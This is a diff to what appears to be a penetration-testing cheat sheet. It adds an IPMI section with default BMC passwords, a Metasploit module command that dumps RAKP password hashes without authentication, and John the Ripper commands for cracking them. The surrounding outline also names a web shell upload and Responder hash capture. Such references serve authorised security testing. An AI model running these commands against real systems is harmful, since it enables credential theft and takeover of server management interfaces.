@@ -52,6 +52,9 @@
     - `2.10.1` odat.py all-modules enumeration
     - `2.10.2` sqlplus connection as sysdba
     - `2.10.3` odat.py UTL_FILE web shell upload
+  - `2.11` **IPMI Enumeration**
+    - `2.11.1` Metasploit IPMI hash dump
+    - `2.11.2` John the Ripper RAKP hash cracking
 - `3` **Initial Attack Vectors**
   - `3.1` **LLMNR/NBT-NS Poisoning**
     - `3.1.1` Responder hash capture
@@ -1047,6 +1050,68 @@ sqlplus <USER>/<PASS>@<TARGET_IP>/<SID> as sysdba
 - `-U <USER>` / `-P <PASS>` — Credentials.
 - `--sysdba` — Use sysdba privilege.
 - `--putFile <REMOTE_PATH> <REMOTE_FILE> <LOCAL_FILE>` — Write `<LOCAL_FILE>` to `<REMOTE_PATH>` on the target as `<REMOTE_FILE>`.
+
+</details>
+
+### 2.11 IPMI Enumeration
+
+BMC (Baseboard Management Controller) interfaces often ship with unchanged default passwords.
+
+**Default credentials**
+
+| Product | Username | Password |
+|---|---|---|
+| Dell iDRAC | `root` | `calvin` |
+| HP iLO | `Administrator` | Randomized 8-char uppercase + digits |
+| Supermicro IPMI | `ADMIN` | `ADMIN` |
+
+#### 2.11.1 Metasploit IPMI hash dump
+
+```bash
+msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
+msf6 > set rhosts <TARGET_IP>
+msf6 > set output_john_file /tmp/ipmi_john.hash
+msf6 > run
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Exploits the IPMI 2.0 RAKP protocol to retrieve SHA1 password hashes without authentication.
+- Works against any IPMI 2.0-compliant BMC (iDRAC, iLO, Supermicro) listening on UDP 623.
+
+**Parameters**
+
+- `rhosts <TARGET_IP>` — Target BMC IP.
+- `output_john_file <PATH>` — Write hashes in John the Ripper RAKP format.
+
+</details>
+
+#### 2.11.2 John the Ripper RAKP hash cracking
+
+```bash
+john --format=rakp --wordlist=/usr/share/wordlists/rockyou.txt /tmp/ipmi_john.hash
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Cracks IPMI 2.0 RAKP hashes using John the Ripper's native `rakp` format.
+- Works with the John-formatted output from Metasploit's `output_john_file` option — no manual hash extraction needed.
+- If wordlist fails and the target is HP iLO, switch to a mask attack for HP's 8-char uppercase+digit format:
+  ```bash
+  john --format=rakp --mask='?u?d' --min-length=8 --max-length=8 /tmp/ipmi_john.hash
+  ```
+
+**Parameters**
+
+- `--format=rakp` — John format for IPMI 2.0 RAKP HMAC-SHA1.
+- `--wordlist=<PATH>` — Dictionary to use.
+- `--mask=<MASK>` — Mask attack for brute-force patterns.
 
 </details>
 
